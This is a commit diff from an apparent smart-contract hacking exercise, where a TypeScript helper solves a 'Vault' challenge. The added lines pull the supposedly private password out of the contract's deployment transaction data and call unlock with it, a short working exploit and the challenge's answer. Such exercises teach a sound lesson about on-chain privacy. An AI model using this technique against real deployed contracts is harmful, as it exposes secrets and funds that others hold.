01ce92c8953788154f81cb932e008f1ec0ab6ad0
Reid Simonton <simonton@gmail.com>
2022-08-05 17:05:14 -0700

    Vault hacked!

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,11 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const data = victim.deployTransaction.data;
+  const password = `0x${data.substr(data.length - 64)}`;
+  //console.log(data);
+  //console.log(password);
+  await victim.unlock(password);
 };
 
 export default helper;
